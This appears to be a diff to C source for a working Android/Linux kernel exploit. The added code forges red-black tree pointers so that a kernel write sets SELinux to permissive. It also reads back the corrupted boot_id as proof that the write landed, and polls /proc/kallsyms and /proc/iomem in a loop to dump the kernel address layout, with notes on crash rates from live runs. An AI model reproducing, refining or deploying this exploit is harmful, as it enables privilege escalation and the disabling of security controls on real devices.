@@ -504,7 +504,47 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
                                    : SLIDE_SYSCTL_BOOTID_OFF;
             tgt = (uint64_t)data_addr(KIMAGE_TEXT_BASE + bid_off);
           }
-          if (ph == 3 || ph == 5) {
+          if (ph == 1) {
+            /*
+             * SELINUX via PLAIN-STORE (F27-proven shape — the zero-write
+             * gadget crashes live walks 9/9): value = P0(0x02BB0000) =
+             * 0xffffff80_2aab0000-style — LE bytes 00 00 .. .. — so
+             * selinux_state.disabled(byte0)=0 AND enforcing(byte1)=0 =
+             * PERMISSIVE. The erase's change_child parent = value&~3 =
+             * P0(0x02BB0000): quiet zeroed .bss (Image-verified, no
+             * kallsyms symbols) — its rb_right(+8) store corrupts only
+             * that scratch. avc ptr @ state+8 untouched (qword0 only).
+             */
+            tree_pc = (uint64_t)data_addr(KIMAGE_TEXT_BASE + 0x02BB0000ULL);
+            tree_r = 0;
+            tree_l = tgt;
+            pi_parent = 0; pi_right = 0; pi_left = 0;
+            stack_prio = 3;
+            stack_deadline = 0;
+            stack_lock = tail + 0x400;
+            pr_info("SC_UMASK ph1 PLAIN-STORE selinux val=%016llx\n",
+                    (unsigned long long)tree_pc);
+            {
+              char st[128];
+              snprintf(st, sizeof(st),
+                       "ph1_plain pc=%016llx l=%016llx lock=%016llx",
+                       (unsigned long long)tree_pc,
+                       (unsigned long long)tree_l,
+                       (unsigned long long)stack_lock);
+              live_sync_log("SS", st);
+            }
+          } else if (ph == 7) {
+            /* ISOLATION TEST: bootid target (ph3 = walk-completing) with
+             * the ph1 VALUE (P0 0x02AB0000). Completing walk -> the
+             * selinux TARGET is the crasher; crashing -> the VALUE. */
+            tree_pc = (uint64_t)data_addr(KIMAGE_TEXT_BASE + 0x02BB0000ULL);
+            tree_r = 0;
+            tree_l = (uint64_t)data_addr(
+                KIMAGE_TEXT_BASE +
+                ((active_offsets && active_offsets->off_slide_boot_id)
+                     ? (uint64_t)active_offsets->off_slide_boot_id
+                     : SLIDE_SYSCTL_BOOTID_OFF));
+          } else if (ph == 3 || ph == 5) {
             /* oracle: plain store (F27-proven shape); ph5 = prio-equal
              * early-exit probe ([3] exit, no erase, no wake) */
             tree_pc = tail + 0x40;
@@ -2062,6 +2102,23 @@ void selfstamp_route(void) {
       {
         char hn[80] = {0};
         read_first_line("/proc/sys/kernel/hostname", hn, sizeof(hn));
+        /* bootid readback FIRST (fastest landing proof — the ph3 store
+         * corrupts the live bootid string; read it before anything else
+         * and persist: survives the system_server crash it causes). */
+        {
+          char bid[64] = {0};
+          read_first_line("/proc/sys/kernel/random/boot_id", bid, sizeof(bid));
+          int bf = open("/data/local/tmp/bootid_readback",
+                        O_WRONLY | O_CREAT | O_TRUNC | O_SYNC, 0644);
+          if (bf >= 0) {
+            if (bid[0])
+              (void)write(bf, bid, strlen(bid));
+            close(bf);
+          }
+          char bl[96];
+          snprintf(bl, sizeof(bl), "SS_BOOTID=[%.40s]", bid);
+          live_sync_log("SS", bl);
+        }
         int hf = open("/data/local/tmp/hostname_readback",
                       O_WRONLY | O_CREAT | O_TRUNC | O_SYNC, 0644);
         if (hf >= 0) {
@@ -2070,8 +2127,34 @@ void selfstamp_route(void) {
         }
         pr_info("SS_HOSTNAME=[%.60s]\n", hn);
       }
+      /*
+       * LOOPING harvester: the selinux zero-store lands ~50-300ms AFTER
+       * the punch (mid-walk) — a single-shot read misses it. Retry the
+       * sources every 10ms for up to 3s; the first successful kallsyms
+       * open means PERMISSIVE LANDED and the dump captures the slide
+       * even while the box dies around us (per-chunk O_SYNC).
+       */
       const char *srcs[] = {"/proc/kallsyms", "/proc/iomem"};
-      for (size_t si = 0; si < 2; si++) {
+      int landed_src = -1;
+      /* 500ms settle: probing SELinux hooks WHILE the walk's qword store
+       * lands can tear the selinux_state bools mid-read (ph1+loop crashed
+       * 2/2; ph3+loop fine — the only interaction is our own opens). */
+      usleep(500000);
+      for (int rep = 0; rep < 250 && landed_src < 0; rep++) {
+        int t0 = open(srcs[0], O_RDONLY | O_CLOEXEC);
+        if (t0 >= 0) {
+          close(t0);
+          landed_src = rep;
+          break;
+        }
+        usleep(10000);
+      }
+      if (landed_src >= 0) {
+        char lm[64];
+        snprintf(lm, sizeof(lm), "PERMISSIVE_LANDED rep=%d", landed_src);
+        live_sync_log("SS", lm);
+      }
+      for (size_t si = 0; si < 2 && landed_src >= 0; si++) {
         int in = open(srcs[si], O_RDONLY | O_CLOEXEC);
         if (in < 0)
           continue;
